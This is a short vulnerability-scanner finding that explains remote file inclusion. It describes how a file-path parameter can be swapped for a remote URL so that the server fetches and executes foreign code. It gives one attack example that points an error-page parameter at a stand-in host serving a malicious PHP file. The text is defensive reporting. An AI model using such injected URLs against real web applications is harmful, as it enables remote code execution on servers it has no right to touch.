Web applications occasionally use parameter values to store the
location of a file which will later be required by the server.

An
example of this is often seen in error pages, where the actual file
path for the error page is stored in a parameter value -- for example
`example.com/error.php?page=404.php`.

A remote file inclusion occurs
when the parameter value (ie. path to file being called by the server)
can be substituted with the address of remote resource -- for example:
`yoursite.com/error.asp?page=http://anothersite.com/somethingBad.php`
In some cases, the server will process the fetched resource;
therefore, if the resource contains server-side code matching that of
the framework being used (ASP, PHP, JSP, etc.), it is probable that
the resource will be executed as if it were part of the web
application.

The tool discovered that it was possible to substitute a
parameter value with an external resource and have the server fetch it
and include its contents in the response.